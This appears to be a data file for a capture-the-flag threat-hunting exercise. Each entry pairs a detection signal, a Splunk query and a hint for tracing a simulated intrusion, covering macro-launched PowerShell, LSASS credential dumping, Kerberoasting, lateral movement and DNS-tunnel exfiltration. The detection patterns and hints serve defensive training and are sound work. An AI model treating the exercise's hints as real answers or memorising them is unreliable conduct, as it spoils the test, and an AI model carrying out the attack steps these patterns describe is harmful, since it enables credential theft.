events.signal: High 404 rate on WEB01 from external scanner IPs
events.splunk_search: index=ctf sourcetype="zeek:http:json" status=404 | stats count by src_ip | where count > 50
events.hint: Look for IPs generating unusually high 404 error rates against the web server

events.signal: External DNS probing of internal CCS subdomains — Autodiscover reveals Exchange infrastructure
events.splunk_search: index=ctf sourcetype="zeek:dns:json" query="*.ccs.dev" | where src_ip="45.142.212.100" | table query
events.hint: The attacker probed multiple CCS subdomains — which one is specific to Microsoft Exchange and reveals mail server infrastructure?

events.signal: WINWORD.EXE spawning cmd.exe
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=1 ParentImage="*WINWORD*" Image="*cmd.exe*"
events.hint: Look for Office applications spawning command-line processes

events.signal: Encoded PowerShell spawned by cmd.exe which was spawned by WINWORD
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=1 Image="*powershell.exe*" CommandLine="* -enc *" | table TimeCreated Computer CommandLine
events.hint: Decode the base64 -enc parameter to reveal the download cradle

events.signal: DNS query for brand-new C2 domain never seen in baseline
events.splunk_search: index=ctf sourcetype="zeek:dns:json" query="cdn-update.globalmetrics.net"
events.hint: Look for DNS queries to domains that have never appeared in the prior 24 hours of logs

events.signal: JA3 hash matching Outlook (a0e9f5d64349fb13191bc781f81f42e1) used by powershell.exe
events.splunk_search: index=ctf sourcetype="zeek:ssl:json" ja3="a0e9f5d64349fb13191bc781f81f42e1" [search index=ctf EventID=3 Image="*powershell*" | rename DestinationIp AS dest_ip | fields dest_ip] | stats count by server_name dest_ip
events.hint: Correlate Sysmon EID 3 network connections from powershell.exe with ssl.log JA3 hashes

events.signal: Scheduled task binary in AppData\Roaming (not Program Files)
events.splunk_search: index=ctf EventID=4698 TaskName="*MicrosoftEdgeUpdate*" | where like(TaskContent,"%AppData%")
events.hint: Legitimate scheduled tasks point to Program Files, not AppData

events.technique_name: Boot or Logon Autostart: Registry Run Keys
events.signal: Registry Run key pointing to AppData path (not a legitimate OneDrive path)
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=13 TargetObject="*Run*" Details="*AppData*Roaming*" NOT Details="*Microsoft\\OneDrive*"
events.hint: Legitimate OneDrive run keys point to %LOCALAPPDATA%, not %APPDATA%\Roaming

events.technique_name: Create or Modify System Process: Windows Service
events.signal: Service binary in C:\Windows\Temp (never legitimate)
events.splunk_search: index=ctf EventID=7045 ImagePath="*Temp*" | table ServiceName ImagePath Computer
events.hint: Legitimate service binaries are never installed in Windows Temp

events.signal: LogonType 9 (NewCredentials) with different TargetUserName than workstation owner
events.splunk_search: index=ctf EventID=4624 LogonType=9 TargetUserName!="lrodriguez" Computer="ccs-ws-1025.ccs.dev"
events.hint: LogonType 9 is used by runas /netonly — look for it where the target account differs from the logged-on user

events.signal: eventvwr.exe spawning suspicious binary at High integrity level
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=1 ParentImage="*eventvwr.exe*" IntegrityLevel=High
events.hint: eventvwr.exe is a known UAC bypass vector — look for it as a parent process

events.signal: New account created on a non-IT workstation by an IT admin token
events.splunk_search: index=ctf EventID=4720 NOT Computer="*DC*" | table TargetUserName SubjectUserName Computer
events.hint: Account creation events on non-IT workstations are suspicious

events.technique_name: Indicator Removal: Clear Windows Event Logs
events.signal: EID 1102 (Security log cleared) — extremely rare in benign traffic
events.splunk_search: index=ctf EventID=1102
events.hint: EventID 1102 means the security log was cleared — search for any instance

events.signal: Sysmon EID 2 (file creation time changed) on executable in AppData
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=2 TargetFilename="*AppData*" TargetFilename="*.exe"
events.hint: EID 2 records when a file creation timestamp is modified — attackers use this to hide malware age

events.signal: Non-system process accessing LSASS with 0x1010 (PROCESS_VM_READ | QUERY_LIMITED)
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=10 TargetImage="*lsass.exe*" NOT SourceImage="*System32*" NOT SourceImage="*SysWOW64*"
events.hint: LSASS access from non-system paths is a strong credential dumping indicator

events.signal: 12 TGS requests in 4 minutes with RC4 (0x17) encryption type instead of AES
events.splunk_search: index=ctf EventID=4769 TicketEncryptionType="0x17" | eval ServiceName=mvindex(split(ServiceName,"/"),0) | stats count by ServiceName | sort -count
events.hint: Kerberoasting requests use RC4 (0x17) — look for sudden spikes in 4769 from a single source

events.signal: EID 4768 with PreAuthType=0 — account does not require pre-authentication
events.splunk_search: index=ctf EventID=4768 PreAuthType=0
events.hint: AS-REP Roasting targets accounts with pre-authentication disabled (PreAuthType=0)

events.signal: Multiple net.exe and nltest.exe commands in rapid succession from svchost32.exe
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=1 (Image="*net.exe*" OR Image="*nltest.exe*") | search ParentImage="*svchost32*" | bin _time span=2m | stats count by _time,Computer
events.hint: Look for Windows built-in tools being spawned by a suspicious process running from C:\Windows\Temp. The specific command reveals what domain information the attacker was after.

events.signal: 180+ EID 4662 events in 6 minutes from one workstation — BloodHound LDAP pattern
events.splunk_search: index=ctf EventID=4662 ObjectType="{bf967aba-0de6-11d0-a285-00aa003049e2}" | bin _time span=10m | stats count by _time,SubjectUserName | where count > 50
events.hint: BloodHound generates massive LDAP object access — look for volume spikes on EID 4662

events.signal: LogonType 3 to CCS-FS01 from victim workstation IP at unusual time
events.splunk_search: index=ctf EventID=4624 LogonType=3 Computer="ccs-fs01.ccs.dev" IpAddress="10.10.10.76"
events.hint: Network logons (type 3) to the file server from a workstation that normally doesn't connect are suspicious

events.signal: PSEXESVC service installed — well-known PsExec artifact
events.splunk_search: index=ctf EventID=7045 ServiceName=PSEXESVC
events.hint: PSEXESVC is always installed by PsExec — any instance is worth investigating

events.signal: RDP logon (LogonType 10) to Executive workstation from IT workstation
events.splunk_search: index=ctf EventID=4624 LogonType=10 Computer="*ccs-lt*" | table TargetUserName IpAddress Computer
events.hint: RDP (LogonType 10) from an IT workstation to an Executive laptop is an unusual pairing

events.signal: 200+ SMB connections to FS01 overnight from IT admin workstation — volume anomaly
events.splunk_search: index=ctf sourcetype="zeek:conn:json" id_resp_p=445 dest_ip="10.10.2.10" | bin _time span=1h | stats sum(orig_bytes) as bytes_sent count by _time,src_ip | where bytes_sent > 100000000
events.hint: Look for abnormally large SMB data volumes to the file server outside business hours

events.signal: DB01 connections originating from FS01 (server-to-server) — unusual baseline
events.splunk_search: index=ctf sourcetype="zeek:conn:json" src_ip="10.10.2.10" dest_ip="10.10.2.20" id_resp_p=5432 | stats sum(resp_bytes) as bytes_pulled
events.hint: Normally only workstations connect to DB01 — connections from FS01 are unusual

events.signal: 6 sessions of 80–120 MB each from CCS-FS01 to unknown external IP at 2am
events.splunk_search: index=ctf sourcetype="zeek:conn:json" src_ip="10.10.2.10" id_resp_p=443 | where orig_bytes > 80000000 | stats count sum(orig_bytes) by dest_ip
events.hint: Large outbound transfers from a server at 2am are a strong exfiltration indicator

events.signal: DNS query for exfil domain never seen in benign baseline
events.splunk_search: index=ctf sourcetype="zeek:dns:json" query="telemetry.syncanalytics.io"
events.hint: The exfil domain will appear as a first-ever DNS query from the file server

events.signal: 337 subdomain DNS queries to r3solve-stats.com over 45 minutes — volume anomaly on single parent domain
events.splunk_search: index=ctf sourcetype="zeek:dns:json" | rex field=query "(?P<parent_domain>[^.]+\.[^.]+)$" | stats count by parent_domain src_ip | sort -count
events.hint: Look for a parent domain that received a disproportionately large number of DNS queries from 10.10.10.76. Legitimate browsing spreads queries across many domains; tunneling concentrates them on one.

events.technique_name: Archive Collected Data: Archive via Utility
events.signal: 7z.exe with -p flag (password-protected archive) in ProgramData\MicrosoftTelemetry
events.splunk_search: index=ctf sourcetype=XmlWinEventLog EventID=1 Image="*7z.exe*" CommandLine="* -p*"
events.hint: Password-protected archives (-p flag) are used to prevent analysis of exfiltrated data
